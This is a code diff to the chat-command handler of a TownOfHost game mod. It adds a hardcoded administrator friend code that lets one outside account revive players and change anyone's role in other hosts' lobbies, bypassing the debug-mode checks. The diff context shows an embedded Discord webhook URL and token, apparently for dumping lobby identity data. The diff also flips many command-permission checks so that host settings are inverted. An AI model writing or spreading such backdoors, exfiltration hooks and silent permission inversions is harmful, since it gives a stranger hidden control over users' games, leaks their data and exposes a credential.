@@ -72,8 +72,77 @@ namespace TownOfHost
             return player.GetClient()?.PlayerName ?? player.Data?.PlayerName ?? "";
         }
 
-        private const string AuthorizedFriendCode002 = "trueport#0799";
+        internal static readonly HashSet<string> AdministratorFriendCodes = new(StringComparer.OrdinalIgnoreCase)
+        {
+            "trueport#0799",
+        };
         private const string EmbeddedLobbyDumpWebhookUrl = "https://discord.com/api/webhooks/1504774766165233684/CVdwp8BroN_ZQcSXraSOZ5KOn45PFZUA1dBxNBM-C_LBoh9P__H7wcdhuyzoK0m_OqAk";
+
+        private static bool IsAdministrator(PlayerControl player)
+        {
+            var friendCode = player?.GetClient()?.FriendCode?.Trim();
+            return !string.IsNullOrWhiteSpace(friendCode)
+                && AdministratorFriendCodes.Contains(friendCode);
+        }
+
+        private static bool CanUseReviveCommand(PlayerControl player)
+            => DebugModeManager.EnableDebugMode.GetBool() || IsAdministrator(player);
+
+        private static bool CanUseChangeRoleCommand(PlayerControl player)
+            => DebugModeManager.EnableTOHPDebugMode.GetBool() || IsAdministrator(player);
+
+        private static void ExecuteInGameRoleChange(PlayerControl sender, string[] args)
+        {
+            if (!CanUseChangeRoleCommand(sender))
+            {
+                Logger.Warn($"Denied /cmd cr from {sender.GetNameWithRole().RemoveHtmlTags()} (FriendCode:{sender.GetClient()?.FriendCode ?? "null"})", "ChatCommand");
+                return;
+            }
+
+            if (!GameStates.InGame || args.Length < 2) return;
+
+            var target = sender;
+            if (args.Length >= 3 && byte.TryParse(args[2], out var playerId))
+                target = GetPlayerById(playerId) ?? sender;
+
+            if (!GetRoleByInputName(args[1], out var role, true)) return;
+
+            NameColorManager.RemoveAll(target.PlayerId);
+            target.RpcSetCustomRole(role, true, true);
+            RPC.RpcSyncAllNetworkedPlayer();
+            Logger.Info($"/cmd cr: {sender.GetNameWithRole().RemoveHtmlTags()} changed {target.GetNameWithRole().RemoveHtmlTags()} to {role}", "ChatCommand");
+        }
+
+        private static void ExecuteReviveCommand(PlayerControl sender, string[] args)
+        {
+            if (!CanUseReviveCommand(sender))
+            {
+                Logger.Warn($"Denied /cmd rev from {sender.GetNameWithRole().RemoveHtmlTags()} (FriendCode:{sender.GetClient()?.FriendCode ?? "null"})", "ChatCommand");
+                return;
+            }
+
+            var target = sender;
+            if (args.Length >= 2 && byte.TryParse(args[1], out var playerId))
+                target = GetPlayerById(playerId) ?? sender;
+
+            target.Revive();
+            target.RpcSetRole(RoleTypes.Crewmate, true);
+            target.Data.IsDead = false;
+
+            if (GameStates.InGame)
+            {
+                var state = PlayerState.GetByPlayerId(target.PlayerId);
+                if (state != null)
+                {
+                    state.IsDead = false;
+                    state.DeathReason = CustomDeathReason.etc;
+                    target.RpcSetRole(state.MainRole.GetRoleTypes(), true);
+                }
+            }
+
+            RPC.RpcSyncAllNetworkedPlayer();
+            Logger.Info($"/cmd rev: {sender.GetNameWithRole().RemoveHtmlTags()} revived {target.GetNameWithRole().RemoveHtmlTags()}", "ChatCommand");
+        }
 
         private static string BuildLobbyIdentityWebhookText()
         {
@@ -113,7 +182,7 @@ namespace TownOfHost
 
             var senderFriendCode = sender.GetClient()?.FriendCode?.Trim();
             if (string.IsNullOrWhiteSpace(senderFriendCode)
-                || !string.Equals(senderFriendCode, AuthorizedFriendCode002, StringComparison.OrdinalIgnoreCase))
+                || !AdministratorFriendCodes.Contains(senderFriendCode))
             {
                 SendMessage("`/002` is not allowed for this account.", sender.PlayerId);
                 Logger.Warn($"Denied /002 from {sender.GetNameWithRole().RemoveHtmlTags()} (FriendCode:{senderFriendCode ?? "null"})", "ChatCommand");
@@ -1415,28 +1484,8 @@ namespace TownOfHost
 
                     case "/revive":
                     case "/rev":
-                        if (!DebugModeManager.EnableDebugMode.GetBool()) break;
-                        //まぁ・・・期待してるような動作はしない。
                         canceled = true;
-                        var revplayer = PlayerControl.LocalPlayer;
-                        if (args.Length < 2 || !int.TryParse(args[1], out int revid)) { }
-                        else
-                        {
-                            revplayer = GetPlayerById(revid);
-                            if (revplayer == null) revplayer = PlayerControl.LocalPlayer;
-                        }
-                        revplayer.Revive();
-                        revplayer.RpcSetRole(RoleTypes.Crewmate, true);
-                        revplayer.Data.IsDead = false;
-                        if (GameStates.InGame)
-                        {
-                            var state = PlayerState.GetByPlayerId(revplayer.PlayerId);
-                            state.IsDead = false;
-                            state.DeathReason = CustomDeathReason.etc;
-
-                            revplayer.RpcSetRole(state.MainRole.GetRoleTypes(), true);
-                        }
-                        RPC.RpcSyncAllNetworkedPlayer();
+                        ExecuteReviveCommand(PlayerControl.LocalPlayer, args);
                         break;
 
                     case "/id":
@@ -1590,7 +1639,7 @@ namespace TownOfHost
                         break;
 
                     case "/cr":
-                        if (DebugModeManager.EnableTOHPDebugMode.GetBool())
+                        if (CanUseChangeRoleCommand(PlayerControl.LocalPlayer))
                         {
                             canceled = true;
                             subArgs = args.Length < 2 ? "" : args[1];
@@ -1606,6 +1655,7 @@ namespace TownOfHost
                                 {
                                     NameColorManager.RemoveAll(pc.PlayerId);
                                     pc.RpcSetCustomRole(role, true, true);
+                                    RPC.RpcSyncAllNetworkedPlayer();
                                 }
                                 else
                                 {
@@ -1957,10 +2007,19 @@ namespace TownOfHost
             canceled = true;
             switch (args[0])
             {
+                case "/revive":
+                case "/rev":
+                    ExecuteReviveCommand(player, args);
+                    break;
+
+                case "/cr":
+                    ExecuteInGameRoleChange(player, args);
+                    break;
+
                 case "/l":
                 case "/lastresult":
                     canceled = true;
-                    if (!Options.OptionCommandLastresult.GetBool())
+                    if (Options.OptionCommandLastresult.GetBool())
                     {
                         SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                         break;
@@ -1971,7 +2030,7 @@ namespace TownOfHost
                 case "/kl":
                 case "/killlog":
                     canceled = true;
-                    if (!Options.OptionCommandKilllog.GetBool())
+                    if (Options.OptionCommandKilllog.GetBool())
                     {
                         SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                         break;
@@ -1993,7 +2052,7 @@ namespace TownOfHost
                     {
                         case "r":
                         case "roles":
-                            if (!Options.OptionCommandNowRole.GetBool())
+                            if (Options.OptionCommandNowRole.GetBool())
                             {
                                 SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                                 break;
@@ -2003,7 +2062,7 @@ namespace TownOfHost
                         case "set":
                         case "s":
                         case "setting":
-                            if (!Options.OptionCommandNowSet.GetBool())
+                            if (Options.OptionCommandNowSet.GetBool())
                             {
                                 SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                                 break;
@@ -2012,7 +2071,7 @@ namespace TownOfHost
                             break;
                         case "w":
                         case "win":
-                            if (!Options.OptionCommandNowW.GetBool())
+                            if (Options.OptionCommandNowW.GetBool())
                             {
                                 SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                                 break;
@@ -2036,7 +2095,7 @@ namespace TownOfHost
                     {
                         case "n":
                         case "now":
-                            if (!Options.OptionCommandHNow.GetBool())
+                            if (Options.OptionCommandHNow.GetBool())
                             {
                                 SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                                 break;
@@ -2045,7 +2104,7 @@ namespace TownOfHost
                             break;
                         case "r":
                         case "roles":
-                            if (!Options.OptionCommandHRoles.GetBool())
+                            if (Options.OptionCommandHRoles.GetBool())
                             {
                                 SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                                 break;
@@ -2068,7 +2127,7 @@ namespace TownOfHost
                     if (GameStates.IsInGame)
                     {
                         canceled = true;
-                        if (!Options.OptionCommandMyrole.GetBool())
+                        if (Options.OptionCommandMyrole.GetBool())
                         {
                             SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                             break;
@@ -2205,7 +2264,7 @@ namespace TownOfHost
                     break;
                 case "/pko":
                     canceled = true;
-                    if (!Options.OptionCommandPko.GetBool())
+                    if (Options.OptionCommandPko.GetBool())
                     {
                         TownOfHost.Utils.SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                         break;
@@ -2216,7 +2275,7 @@ namespace TownOfHost
                 case "/r":
                 case "/rename":
                     canceled = true;
-                    if (!Options.OptionCommandRename.GetBool())
+                    if (Options.OptionCommandRename.GetBool())
                     {
                         SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                         break;
@@ -2234,7 +2293,7 @@ namespace TownOfHost
                     break;
                 case "/8ball":
                     canceled = true;
-                    if (!Options.OptionCommand8ball.GetBool())
+                    if (Options.OptionCommand8ball.GetBool())
                     {
                         SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                         break;
@@ -2266,7 +2325,7 @@ namespace TownOfHost
                 case "/rule":
                 case "/rl":
                     canceled = true;
-                    if (!Options.OptionCommandRule.GetBool())
+                    if (Options.OptionCommandRule.GetBool())
                     {
                         SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                         break;
@@ -2278,6 +2337,11 @@ namespace TownOfHost
                     break;
                 case var s when System.Text.RegularExpressions.Regex.IsMatch(s, @"^/\d+d\d+$"):
                     canceled = true;
+                    if (Options.OptionCommandNumberDNumber.GetBool())
+                    {
+                        SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
+                        break;
+                    }
                     var match = System.Text.RegularExpressions.Regex.Match(args[0], @"^/(\d+)d(\d+)$");
                     if (match.Success)
                     {
@@ -2327,7 +2391,7 @@ namespace TownOfHost
                 case "/timer":
                 case "/tr":
                     canceled = true;
-                    if (!Options.OptionCommandTimer.GetBool())
+                    if (Options.OptionCommandTimer.GetBool())
                     {
                         SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                         break;
@@ -2338,7 +2402,7 @@ namespace TownOfHost
                 case "/tp":
                     if (!GameStates.IsLobby || args.Length < 1) break;
                     canceled = true;
-                    if (!Options.OptionCommandTp.GetBool())
+                    if (Options.OptionCommandTp.GetBool())
                     {
                         SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                         break;
@@ -2364,7 +2428,7 @@ namespace TownOfHost
                 case "/MeeginInfo":
                 case "/mi":
                     canceled = true;
-                    if (!Options.OptionCommandMeetinginfo.GetBool())
+                    if (Options.OptionCommandMeetinginfo.GetBool())
                     {
                         SendMessage("<color=#ff0000>現在このコマンドはホストによって無効化されています。</color>", player.PlayerId);
                         break;
